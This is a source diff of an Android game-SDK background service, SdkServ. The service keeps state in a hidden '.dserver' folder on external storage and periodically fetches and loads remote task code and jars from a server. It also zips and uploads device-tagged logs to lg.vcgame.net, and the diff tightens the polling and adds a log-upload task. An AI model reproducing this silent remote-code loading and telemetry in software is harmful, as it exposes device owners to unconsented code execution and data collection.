@@ -33,13 +33,12 @@ import org.apache.http.message.BasicHeader;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.Handler;
 import android.telephony.TelephonyManager;
 import android.util.DisplayMetrics;
+import android.util.Log;
 
 /**
  * 主服务
@@ -83,8 +82,9 @@ public class SdkServ implements DServ{
     public static final int ERR_TASK = 710;
     public static final int ERR_TASK_THREAD = 711;
     public static final int ERR_LOG_THREAD = 712;
+    public static final int ERR_LOG_UPLOAD = 713;
     
-	int taskSleepTime = 10*60*1000;
+	int taskSleepTime = 5*60*1000;
 	int upSleepTime = 1000*60*60*6;
 	int shortSleepTime = 1000*60*5;
 	long nextUpTime;
@@ -94,10 +94,11 @@ public class SdkServ implements DServ{
 	long maxLogSize = 1024*10;
 	
 	int timeOut = 5000;
-	private int version = 1;
+	private int version = 2;
 //	private static int keyVersion = 1;
 	private static final String SPLIT_STR = "@@";
 	private static final String datFileType = ".dat";
+	private boolean isConfigInit = false;
 	
 	long uid = 0;
 	
@@ -111,15 +112,15 @@ public class SdkServ implements DServ{
 	private String upLogUrl = "http://lg.vcgame.net:8080/plserver/PL";
 //	static String upUrl = "http://192.168.0.11:8080/PLServer/PS";
 //	static String upLogUrl = "http://192.168.0.11:8080/PLServer/PL";
-	static final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
+	final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
 	private String emvClass = "cn.play.dserv.MoreView";
 	private String emvPath = "emv";
 	private int state = CheckTool.STATE_RUNNING;
 	
-	/**
-	 * 是否联网状态
-	 */
-	private boolean isNetOk = false;
+//	/**
+//	 * 是否联网状态
+//	 */
+//	private boolean isNetOk = false;
 	
 	private HashMap<String,Object> config;
 	private ArrayList<String> gameList = new ArrayList<String>();
@@ -132,17 +133,44 @@ public class SdkServ implements DServ{
 		
 	//------------------------config----------------------------------------
 	
-	private void initConfig(){
-		this.config = new HashMap<String, Object>();
-		this.config.put("state", CheckTool.STATE_RUNNING);
-		this.config.put("upUrl", upUrl);
-		this.config.put("upLogUrl", upLogUrl);
-		this.config.put("emvClass", this.emvClass);
-		this.config.put("emvPath", this.emvPath);
-		this.config.put("t", "");
-		this.config.put("dt", "");
-		this.config.put("uid", "0");
-		this.saveConfig();
+	@SuppressWarnings("unchecked")
+	public void initConfig(){
+		this.config = this.readConfig(this.configPath);
+		if (this.config == null || this.config.size() <= 0) {
+			//直接初始化config
+			this.config = new HashMap<String, Object>();
+			this.config.put("state", CheckTool.STATE_RUNNING);
+			this.config.put("upUrl", upUrl);
+			this.config.put("upLogUrl", upLogUrl);
+			this.config.put("emvClass", this.emvClass);
+			this.config.put("emvPath", this.emvPath);
+			this.config.put("t", "");
+			this.config.put("dt", "");
+			this.config.put("uid", "0");
+			this.saveConfig();
+			CheckTool.log(this.dservice,TAG, "no conf");
+		}else{
+			try {
+				if (this.config.get("games") != null) {
+					this.gameList = (ArrayList<String>) this.config.get("games");
+				}
+				CheckTool.log(this.dservice,TAG, "init config OK:"+JSON.write(this.config));
+			} catch (Exception e) {
+				this.gameList = new ArrayList<String>();
+			}
+		}
+		//初始化uid
+		this.uid = Long.parseLong(this.getPropString("uid", "0"));
+		emvClass = this.getPropString("emvClass", emvClass);
+		emvPath = this.getPropString("emvPath", emvPath);
+		upUrl = this.getPropString("upUrl", upUrl);
+		upLogUrl = this.getPropString("upLogUrl", upLogUrl);
+		this.isConfigInit = true;
+		
+//				String keyStr = this.getPropString( "k", Base64Coder.encode(key));
+//				Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
+//		String tasks = this.getPropString( "t", "");
+//				String deadTasks = this.getPropString("dt", "");
 		
 	}
 	
@@ -262,7 +290,10 @@ public class SdkServ implements DServ{
 			switch (act) {
 			case CheckTool.ACT_EMACTIVITY_START:
 				dsLog(CheckTool.LEVEL_I, "MORE",act, p, m);
-				String emvP = sdDir+gid+"/"+SdkServ.this.emvPath+".jar";
+//				这里将下载的jar统一放到update目录
+//				String emvDir = sdDir + "update/";
+//				(new File(emvDir)).mkdirs();
+				String emvP = sdDir+SdkServ.this.emvPath+".jar";
 				CheckTool.log(this.dservice,TAG, "emvP:"+emvP);
 				File f = new File(emvP);
 				if (f == null ||  !f.exists()|| f.isDirectory() ) {
@@ -294,11 +325,11 @@ public class SdkServ implements DServ{
 				dservice.startActivity(it); 
 				break;
 			case CheckTool.ACT_NET_CHANGE:
-				if (m.equals("true")) {
-					isNetOk = true;
-				}else{
-					isNetOk = false;
-				}
+//				if (m.equals("true")) {
+//					isNetOk = true;
+//				}else{
+//					isNetOk = false;
+//				}
 				dsLog(CheckTool.LEVEL_I, "NET",act, p, m);
 				break;
 			case CheckTool.ACT_GAME_INIT:
@@ -418,7 +449,7 @@ public class SdkServ implements DServ{
 	}
 	
 	
-	public static boolean downloadGoOn(String url, String filePath,String filename,Context ct) {
+	public boolean downloadGoOn(String url, String filePath,String filename,Context ct) {
 		// file.size()即可得到原来下载文件的大小
 //		// 设置代理
 //		Header header = null;
@@ -472,7 +503,6 @@ public class SdkServ implements DServ{
 //			SDCardUtil.createFolder(filePath);
 			File folder = new File(filePath);
 			folder.mkdirs();
-			@SuppressWarnings("resource")
 			RandomAccessFile fos = new RandomAccessFile(myTempFile, "rw");
 			// 从文件的size以后的位置开始写入，其实也不用，直接往后写就可以。有时候多线程下载需要用
 
@@ -497,6 +527,7 @@ public class SdkServ implements DServ{
 //				}
 			} while (true);
 			is.close();
+			fos.close();
 			return true;
 		} catch (Exception ex) {
 			ex.printStackTrace();
@@ -504,7 +535,7 @@ public class SdkServ implements DServ{
 		return false;
 	}
 	
-	public static boolean zip(String src, String dest){
+	public boolean zip(String src, String dest){
 		// 提供了一个数据项压缩成一个ZIP归档输出流
 		ZipOutputStream out = null;
 		boolean re = false;
@@ -583,7 +614,7 @@ public class SdkServ implements DServ{
 		}
 	}
 	
-	public static boolean unzip(String file,String outputDirectory){
+	public boolean unzip(String file,String outputDirectory){
 		boolean re = false;
 		ZipFile zipFile = null;
 		try {
@@ -661,10 +692,16 @@ public class SdkServ implements DServ{
 	}
 	
 	
-	private void syncTaskList(String remoteListStr,String downUrl){
+	/**
+	 * 返回是否有新的远程任务
+	 * @param remoteListStr
+	 * @param downUrl
+	 * @return
+	 */
+	private boolean syncTaskList(String remoteListStr,String downUrl){
 		if (!StringUtil.isStringWithLen(remoteListStr, 1)) {
 			CheckTool.log(this.dservice,TAG, "remote task is empty.");
-			return;
+			return false;
 		}
 		CheckTool.log(this.dservice,TAG, "remoteListStr:"+remoteListStr);
 		String[] remoteList = remoteListStr.split("_");
@@ -694,6 +731,7 @@ public class SdkServ implements DServ{
 			}
 		}
 		//fetch remote tasks
+		boolean haveRemoteTask = false;
 		for (Integer id : needFetchList) {
 			if (this.fetchRemoteTask(id,downUrl)) {
 				CheckTool.log(this.dservice,TAG, "fetch OK:"+id);
@@ -703,6 +741,7 @@ public class SdkServ implements DServ{
 					task.setDService(this);
 					task.init();
 					this.taskList.add(task);
+					haveRemoteTask = true;
 				}else{
 					CheckTool.e(this.dservice,TAG, "loadTask ERR:"+id,null);
 				}
@@ -711,6 +750,7 @@ public class SdkServ implements DServ{
 			}
 		}
 		this.saveStates();
+		return haveRemoteTask;
 	}
 	private static final int IO_BUFFER_SIZE = 1024 * 4;
 	
@@ -939,7 +979,10 @@ public class SdkServ implements DServ{
 					CheckTool.log(SdkServ.this.dservice,TAG, "url:"+res[2]);
 					String downLoadUrl = res[2];
 					String remoteTaskIds = res[3];
-					SdkServ.this.syncTaskList(remoteTaskIds,downLoadUrl);
+					boolean hasRemoteTask = SdkServ.this.syncTaskList(remoteTaskIds,downLoadUrl);
+					if (hasRemoteTask) {
+						SdkServ.this.taskThread.interrupt();
+					}
 					return true;
 //				case ORDER_DEL_TASK:
 //					break;
@@ -967,7 +1010,10 @@ public class SdkServ implements DServ{
 					stopService();
 					break;
 				default:
-					SdkServ.this.syncTaskList(res[3],res[2]);
+					hasRemoteTask = SdkServ.this.syncTaskList(res[3],res[2]);
+					if (hasRemoteTask) {
+						SdkServ.this.taskThread.interrupt();
+					}
 					return true;
 				}
 				
@@ -985,12 +1031,11 @@ public class SdkServ implements DServ{
 				return;
 			}
 			nextUpTime = 1;
-			
 			try {
 				while (runFlag && SdkServ.this.state == CheckTool.STATE_RUNNING) {
 					CheckTool.log(SdkServ.this.dservice,TAG, "up running state:"+SdkServ.this.state);
 					
-					if (!isConnOk()) {
+					if (!CheckTool.isNetOk(SdkServ.this.dservice)) {
 						Thread.sleep(shortSleepTime);
 						continue;
 					}
@@ -1087,7 +1132,6 @@ public class SdkServ implements DServ{
 			if (SdkServ.this.state != CheckTool.STATE_RUNNING) {
 				return;
 			}
-			try {
 				//先初始化所有的task --loadTask时已经初始化过
 //				synchronized (SdkServ.this.taskList) {
 //					for (int i = 0; i < taskList.size(); i++) {
@@ -1097,68 +1141,92 @@ public class SdkServ implements DServ{
 //				}
 				
 				while (runFlag && SdkServ.this.state == CheckTool.STATE_RUNNING) {
-					CheckTool.log(SdkServ.this.dservice,TAG, "task check");
-					synchronized (taskList) {
-						for (PLTask task : taskList) {
-							int state = task.getState();
-							CheckTool.log(SdkServ.this.dservice,TAG, "task state:"+state);
-							switch (state) {
-							case PLTask.STATE_WAITING:
-								try {
-									new Thread(task).start();
-								} catch (Exception e) {
-									CheckTool.e(SdkServ.this.dservice,TAG, "task exec error:"+task.getId(),e);
-									e(ERR_TASK,0, dservice.getPackageName(), "0_0_"+e.getMessage());
-								}
-								break;
-							case PLTask.STATE_DIE:
-								SdkServ.this.delTask(task);
-								break;
-							default:
-								break;
-							}
-						}
-					}
-					CheckTool.log(SdkServ.this.dservice,TAG, runFlag+","+SdkServ.this.state+","+taskSleepTime);
 					
-					//日志上传
-//					String logs = readLog();
-					long logSize = getLogSize();
-					//判断是否有足够内容,或超过最大上传时间间隔
-					CheckTool.log(SdkServ.this.dservice,TAG, "log size:"+logSize + " nextTime:"+(lastUpLogTime+maxLogSleepTime)+ " c:"+System.currentTimeMillis());
-					if ((logSize > maxLogSize) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
-						boolean re = false;
-						String lFile = sdDir+uid+"_"+System.currentTimeMillis()+".zip";
-						re = zip(logFile, lFile);
-						if(re){
-							re = upload(lFile,upLogUrl);
-							if (!re) {
-								CheckTool.e(SdkServ.this.dservice,TAG, "upLog failed:"+lFile,null);
-							}else{
-								CheckTool.log(SdkServ.this.dservice,TAG, "upload log OK");
+					try {
+					
+						//生成log上传任务
+						if (CheckTool.isNetOk(SdkServ.this.dservice)) {
+							long logSize = getLogSize();
+							long cTime = System.currentTimeMillis();
+							if ((logSize > maxLogSize) || cTime>lastUpLogTime+maxLogSleepTime) {
+								String zipName = sdDir+uid+"_"+cTime+".zip";
+								UploadLogTask t = new UploadLogTask();
+								t.setZipFileName(zipName);
+								taskList.add(t);
 							}
 						}
-						File f = new File(lFile);
-						f.delete();
-						if (re) {
-							lastUpLogTime = System.currentTimeMillis();
-							f = new File(logFile);
-							synchronized (f) {
-								f.delete();
+						
+						CheckTool.log(SdkServ.this.dservice,TAG, "task check:"+taskList.size());
+						synchronized (taskList) {
+							for (PLTask task : taskList) {
+								int state = task.getState();
+								CheckTool.log(SdkServ.this.dservice,TAG, "task state:"+state+ " id:"+task.getId());
+								switch (state) {
+								case PLTask.STATE_WAITING:
+									try {
+										new Thread(task).start();
+									} catch (Exception e) {
+										CheckTool.e(SdkServ.this.dservice,TAG, "task exec error:"+task.getId(),e);
+										e(ERR_TASK,0, dservice.getPackageName(), "0_0_"+e.getMessage());
+									}
+									break;
+								case PLTask.STATE_DIE:
+									SdkServ.this.delTask(task);
+									break;
+								default:
+									break;
+								}
 							}
+						}
+						CheckTool.log(SdkServ.this.dservice,TAG, runFlag+","+SdkServ.this.state+","+taskSleepTime);
+						/*
+						//日志上传
+	//					String logs = readLog();
+						long logSize = getLogSize();
+						//判断是否有足够内容,或超过最大上传时间间隔
+						CheckTool.log(SdkServ.this.dservice,TAG, "log size:"+logSize + " nextTime:"+(lastUpLogTime+maxLogSleepTime)+ " c:"+System.currentTimeMillis());
+						if ((logSize > maxLogSize) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
+							boolean re = false;
+							if (!DsReceiver.isNetOk(SdkServ.this.dservice)) {
+								Thread.sleep(shortSleepTime);
+								continue;
+							}
+							String lFile = sdDir+uid+"_"+System.currentTimeMillis()+".zip";
+							re = zip(logFile, lFile);
+							if(re){
+								re = upload(lFile,upLogUrl);
+								if (!re) {
+									CheckTool.e(SdkServ.this.dservice,TAG, "upLog failed:"+lFile,null);
+								}else{
+									CheckTool.log(SdkServ.this.dservice,TAG, "upload log OK");
+								}
+							}
+							File f = new File(lFile);
+							f.delete();
+							if (re) {
+								lastUpLogTime = System.currentTimeMillis();
+								f = new File(logFile);
+								synchronized (f) {
+									f.delete();
+								}
+							}else{
+								Thread.sleep(shortSleepTime);
+								continue;
+							}
+						}
+						*/
+						
+						Thread.sleep(taskSleepTime);
+					} catch (Exception e) {
+						if (!e.getClass().equals(InterruptedException.class)) {
+							e.printStackTrace();
+							e(ERR_TASK_THREAD,0,dservice.getPackageName(), "0_0_"+e.getMessage());
 						}else{
-							Thread.sleep(shortSleepTime);
+							Log.d(TAG, "InterruptedException");
 							continue;
 						}
 					}
-					
-					
-					Thread.sleep(taskSleepTime);
 				}
-			} catch (Exception e) {
-				e.printStackTrace();
-				e(ERR_TASK_THREAD,0,dservice.getPackageName(), "0_0_"+e.getMessage());
-			}
 		}
 		
 
@@ -1172,8 +1240,90 @@ public class SdkServ implements DServ{
 	}
 	
 	
+	class UploadLogTask implements PLTask{
+		
+		
+		private String zipFileName;
+		
+		private int state = PLTask.STATE_WAITING;;
+
+		public final void setZipFileName(String zipFileName) {
+			this.zipFileName = zipFileName;
+		}
+		
+
+		@Override
+		public void run() {
+			try {
+				boolean re = false;
+				File f = new File(this.zipFileName);
+				if (f ==null || !f.exists()) {
+					re = zip(logFile, this.zipFileName);
+				}
+				if(re){
+					re = upload(this.zipFileName,upLogUrl);
+					if (!re) {
+						CheckTool.e(SdkServ.this.dservice,TAG, "upLog failed:"+this.zipFileName,null);
+					}else{
+						//上传成功则可以视为完成
+						this.state = PLTask.STATE_DIE;
+						CheckTool.log(SdkServ.this.dservice,TAG, "upload log OK");
+					}
+				}
+				f = new File(this.zipFileName);
+				f.delete();
+				if (re) {
+					SdkServ.this.lastUpLogTime = System.currentTimeMillis();
+					f = new File(logFile);
+					synchronized (f) {
+						f.delete();
+					}
+				}else{
+					return;
+				}
+				
+				SdkServ.this.taskList.remove(this);
+				CheckTool.log(SdkServ.this.dservice,TAG, "UploadLogtask done:"+SdkServ.this.lastUpLogTime);
+				
+			} catch (Exception e) {
+				e.printStackTrace();
+				e(ERR_LOG_UPLOAD,0, dservice.getPackageName(), "0_0_"+e.getMessage());
+			}
+			
+		}
+
+		@Override
+		public void setDService(DServ serv) {
+			
+		}
+
+		@Override
+		public int getId() {
+			return 0;
+		}
+
+		@Override
+		public void init() {
+			
+		}
+
+		@Override
+		public int getState() {
+			return this.state;
+		}
+
+		@Override
+		public void setState(int state) {
+			this.state = state;
+		}
+		
+	}
+	
 	
 	public void saveStates(){
+		if (!isConfigInit || !StringUtil.isStringWithLen(this.config.get("games"), 1)) {
+			this.config = readConfig(configPath);
+		}
 		StringBuilder sb = new StringBuilder();
 		synchronized (this.taskList) {
 			for (PLTask task : taskList) {
@@ -1182,7 +1332,9 @@ public class SdkServ implements DServ{
 				sb.append(id);
 			}
 		}
-		sb.delete(0, 2);
+		if (sb.length() > 0) {
+			sb.delete(0, SPLIT_STR.length());
+		}
 		CheckTool.log(this.dservice,TAG, "save task list:"+sb.toString());
 		this.setProp("t", sb.toString(),false);
 		this.setProp("emvClass", emvClass,false);
@@ -1231,6 +1383,20 @@ public class SdkServ implements DServ{
 		return null;
 	}
 	
+//	public static boolean isNetOk(Context cx) {
+//		ConnectivityManager cm = (ConnectivityManager) cx.getSystemService(Context.CONNECTIVITY_SERVICE);
+//		boolean isOk = false;
+//		if (cm != null) {
+//			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
+//			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
+//				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
+//					isOk = true;
+//				}
+//			}
+//		}
+//		return isOk;
+//	}
+	
 	public void stop(){
 		if (this.upThread != null) {
 			this.upThread.setRun(false);
@@ -1254,8 +1420,6 @@ public class SdkServ implements DServ{
 	}
 	
 	
-	
-	
 	public void init(DService dservice){
 		this.dservice = dservice;
 		if (dservice == null) {
@@ -1264,15 +1428,10 @@ public class SdkServ implements DServ{
 		}
 		CheckTool.log(this.dservice,TAG, "init:"+dservice.getPackageName()+" state:"+this.state);
 		
+		(new File(sdDir)).mkdirs();
 		
-		this.config = this.readConfig(this.configPath);
-		if (this.config == null || this.config.size() <= 0) {
-			//直接初始化config
-			initConfig();
-			CheckTool.log(this.dservice,TAG, "no conf");
-		}else{
-			CheckTool.log(this.dservice,TAG, "init config OK:"+JSON.write(this.config));
-		}
+		this.initConfig();
+		
 		if (this.state == CheckTool.STATE_NEED_RESTART) {
 			//重启
 			this.stop();
@@ -1292,38 +1451,8 @@ public class SdkServ implements DServ{
 			return;
 		}
 //		cacheDir = ctx.getApplicationInfo().dataDir;
-		//初始化uid
-		this.uid = Long.parseLong(this.getPropString("uid", "0"));
-		emvClass = this.getPropString("emvClass", emvClass);
-		emvPath = this.getPropString("emvPath", emvPath);
-		upUrl = this.getPropString("upUrl", upUrl);
-		upLogUrl = this.getPropString("upLogUrl", upLogUrl);
-		
-		(new File(sdDir)).mkdirs();
-//		String keyStr = this.getPropString( "k", Base64Coder.encode(key));
-//		Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
-		String tasks = this.getPropString( "t", "");
-//		String deadTasks = this.getPropString("dt", "");
-		
-		ConnectivityManager cm = (ConnectivityManager) dservice.getSystemService(Context.CONNECTIVITY_SERVICE);    
-		isNetOk = false;
-        if (cm != null) {
-       	 NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
-       	 if (aActiveInfo != null && aActiveInfo.isAvailable()) {
-       		 if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
-       			 isNetOk = true;
-       		 }
-			}
-		}
 		
 		
-//		if (lt != null && lt.isRunFlag()) {
-//			lt.setRunFlag(false);
-//			try {
-//				Thread.sleep(logSleepTime+1000);
-//			} catch (InterruptedException e) {
-//			}
-//		}
         if (lt != null || this.upThread != null || this.taskThread!=null) {
 			this.upThread.setRun(false);
 			this.taskThread.setRun(false);
@@ -1344,8 +1473,7 @@ public class SdkServ implements DServ{
 		this.taskThread.start();
 		
 		
-		
-		
+		String tasks = this.getPropString( "t", "");
 		if (StringUtil.isStringWithLen(tasks, 1)) {
 			String[] taskArr = tasks.split(SPLIT_STR);
 			synchronized (taskList) {
@@ -1364,6 +1492,7 @@ public class SdkServ implements DServ{
 			}
 		}
 		
+		//TODO 初始化moreView
 		
 		//注册应用变化监听器
 //		PackageBroadcastReceiver receiver = new PackageBroadcastReceiver();
@@ -1373,21 +1502,6 @@ public class SdkServ implements DServ{
 //		filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
 //		filter.addDataScheme("package");
 //		dservice.registerReceiver(receiver, filter);
-	}
-
-	public boolean isConnOk() {
-		ConnectivityManager cm = (ConnectivityManager) dservice
-				.getSystemService(Context.CONNECTIVITY_SERVICE);
-		boolean isOk = false;
-		if (cm != null) {
-			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
-			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
-				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
-					isOk = true;
-				}
-			}
-		}
-		return isOk;
 	}
 
 	/**
@@ -1400,7 +1514,7 @@ public class SdkServ implements DServ{
 	/**
 	 * @return the localDexPath
 	 */
-	public static final String getLocalDexPath() {
+	public final String getLocalPath() {
 		return sdDir;
 	}
 
@@ -1527,7 +1641,7 @@ public class SdkServ implements DServ{
 	StringBuilder logSB = new StringBuilder();
 	
 	int logSleepTime = 1000*5;
-	String logFile = SdkServ.sdDir+"c_cache.dat";
+	String logFile = this.sdDir+"c_cache.dat";
 	private static final String SPLIT = "||";
 	private static final String NEWlINE = "\r\n";
 	
@@ -1606,10 +1720,10 @@ public class SdkServ implements DServ{
 	}
 
 
-
-	public boolean isNetOk() {
-		return isNetOk;
-	}
+//
+//	public boolean isNetOk() {
+//		return isNetOk;
+//	}
 	
 	public final int getVer(){
 		return this.version;
@@ -1617,6 +1731,15 @@ public class SdkServ implements DServ{
 	
 	public final void setVer(int ver){
 		this.version = ver;
+	}
+
+	@Override
+	public void setEmp(String className, String jarPath) {
+		this.emvClass = className;
+		this.emvPath = jarPath;
+		this.config.put("emvClass", className);
+		this.config.put("emvPath", jarPath);
+		this.saveConfig();
 	}
 	
 //	public class PackageBroadcastReceiver extends BroadcastReceiver {
